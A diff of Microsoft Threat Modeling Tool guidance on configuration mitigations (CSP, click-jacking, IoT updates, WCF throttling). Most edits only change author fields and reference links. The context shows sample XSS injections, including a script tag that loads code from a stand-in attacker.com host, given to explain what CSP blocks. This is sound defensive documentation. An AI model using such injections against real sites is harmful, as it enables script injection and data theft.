@@ -3,9 +3,9 @@ title: Configuration Management - Microsoft Threat Modeling Tool - Azure | Micro
 description: mitigations for threats exposed in the Threat Modeling Tool 
 services: security
 documentationcenter: na
-author: RodSan
-manager: RodSan
-editor: RodSan
+author: jegeib
+manager: jegeib
+editor: jegeib
 
 ms.assetid: na
 ms.service: security
@@ -13,8 +13,8 @@ ms.workload: na
 ms.tgt_pltfrm: na
 ms.devlang: na
 ms.topic: article
-ms.date: 08/17/2017
-ms.author: rodsan
+ms.date: 02/07/2017
+ms.author: jegeib
 
 ---
 
@@ -39,7 +39,7 @@ ms.author: rodsan
 | **SDL Phase**               | Build |  
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
-| **References**              | [An Introduction to Content Security Policy](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Content Security Policy Reference](http://content-security-policy.com/), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introduction to content security policy](https://docs.webplatform.org/wiki/tutorials/content-security-policy), [Can I use CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
+| **References**              | [An Introduction to Content Security Policy](http://www.html5rocks.com/en/tutorials/security/content-security-policy/), [Content Security Policy Reference](http://content-security-policy.com/), [Security features](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/), [Introduction to content security policy](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy), [Can I use CSP?](http://caniuse.com/#feat=contentsecuritypolicy) |
 | **Steps** | <p>Content Security Policy (CSP) is a defense-in-depth security mechanism, a W3C standard, that enables web application owners to have control on the content embedded in their site. CSP is added as an HTTP response header on the web server and is enforced on the client side by browsers. It is a whitelist-based policy - a website can declare a set of trusted domains from which active content such as JavaScript can be loaded.</p><p>CSP provides the following security benefits:</p><ul><li>**Protection against XSS:** If a page is vulnerable to XSS, an attacker can exploit it in 2 ways:<ul><li>Inject `<script>malicious code</script>`. This exploit will not work due to CSP’s Base Restriction-1</li><li>Inject `<script src=”http://attacker.com/maliciousCode.js”/>`. This exploit will not work since the attacker controlled domain will not be in CSP’s whitelist of domains</li></ul></li><li>**Control over data exfiltration:** If any malicious content on a webpage attempts to connect to an external website and steal data, the connection will be aborted by CSP. This is because the target domain will not be in CSP’s whitelist</li><li>**Defense against click-jacking:** click-jacking is an attack technique using which an adversary can frame a genuine website and force users to click on UI elements. Currently defense against click-jacking is achieved by configuring a response header- X-Frame-Options. Not all browsers respect this header and going forward CSP will be a standard way to defend against click-jacking</li><li>**Real-time attack reporting:** If there is an injection attack on a CSP-enabled website, browsers will automatically trigger a notification to an endpoint configured on the webserver. This way, CSP serves as a real-time warning system.</li></ul> |
 
 ### Example
@@ -104,7 +104,7 @@ Example: var str="alert(1)"; eval(str);
 | **SDL Phase**               | Build |  
 | **Applicable Technologies** | Generic |
 | **Attributes**              | N/A  |
-| **References**              | [OWASP click-jacking Defense Cheat Sheet](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - Combating click-jacking With X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-click-jacking-with-x-frame-options/) |
+| **References**              | [OWASP click-jacking Defense Cheat Sheet](https://www.owasp.org/index.php/Clickjacking_Defense_Cheat_Sheet), [IE Internals - Combating click-jacking With X-Frame-Options](https://blogs.msdn.microsoft.com/ieinternals/2010/03/30/combating-clickjacking-with-x-frame-options/) |
 | **Steps** | <p>click-jacking, also known as a "UI redress attack", is when an attacker uses multiple transparent or opaque layers to trick a user into clicking on a button or link on another page when they were intending to click on the top-level page.</p><p>This layering is achieved by crafting a malicious page with an iframe, which loads the victim's page. Thus, the attacker is "hijacking" clicks meant for their page and routing them to another page, most likely owned by another application, domain, or both. To prevent click-jacking attacks, set the proper X-Frame-Options HTTP response headers that instruct the browser to not allow framing from other domains</p>|
 
 ### Example
@@ -561,7 +561,7 @@ To disable CORS for a controller or action, use the [DisableCors] attribute.
 | **SDL Phase**               | Build |  
 | **Applicable Technologies** | Generic |
 | **Attributes**              | Gateway choice - Azure IoT Hub |
-| **References**              | [IoT Hub Device Management Overview](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [How to update Device Firmware](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-device-jobs/) |
+| **References**              | [IoT Hub Device Management Overview](https://azure.microsoft.com/documentation/articles/iot-hub-device-management-overview/), [How to update Device Firmware](https://docs.microsoft.com/azure/iot-hub/tutorial-firmware-update) |
 | **Steps** | LWM2M is a protocol from the Open Mobile Alliance for IoT Device Management. Azure IoT device management allows to interact with physical devices using device jobs. Ensure that the Cloud Gateway implements a process to routinely keep the device and other configuration data up to date using Azure IoT Hub Device Management. |
 
 ## <a id="controls-policies"></a>Ensure that devices have end-point security controls configured as per organizational policies
@@ -605,7 +605,7 @@ To disable CORS for a controller or action, use the [DisableCors] attribute.
 | **SDL Phase**               | Build |  
 | **Applicable Technologies** | .NET Framework 3 |
 | **Attributes**              | N/A  |
-| **References**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
+| **References**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
 | **Steps** | <p>Not placing a limit on the use of system resources could result in resource exhaustion and ultimately a denial of service.</p><ul><li>**EXPLANATION:** Windows Communication Foundation (WCF) offers the ability to throttle service requests. Allowing too many client requests can flood a system and exhaust its resources. On the other hand, allowing only a small number of requests to a service can prevent legitimate users from using the service. Each service should be individually tuned to and configured to allow the appropriate amount of resources.</li><li>**RECOMMENDATIONS** Enable WCF's service throttling feature and set limits appropriate for your application.</li></ul>|
 
 ### Example
@@ -628,7 +628,7 @@ The following is an example configuration with throttling enabled:
 | **SDL Phase**               | Build |  
 | **Applicable Technologies** | .NET Framework 3 |
 | **Attributes**              | N/A  |
-| **References**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com/en/vulncat/index.html) |
+| **References**              | [MSDN](https://msdn.microsoft.com/library/ff648500.aspx), [Fortify Kingdom](https://vulncat.fortify.com) |
 | **Steps** | Metadata can help attackers learn about the system and plan a form of attack. WCF services can be configured to expose metadata. Metadata gives detailed service description information and should not be broadcast in production environments. The `HttpGetEnabled` / `HttpsGetEnabled` properties of the ServiceMetaData class defines whether a service will expose the metadata | 
 
 ### Example
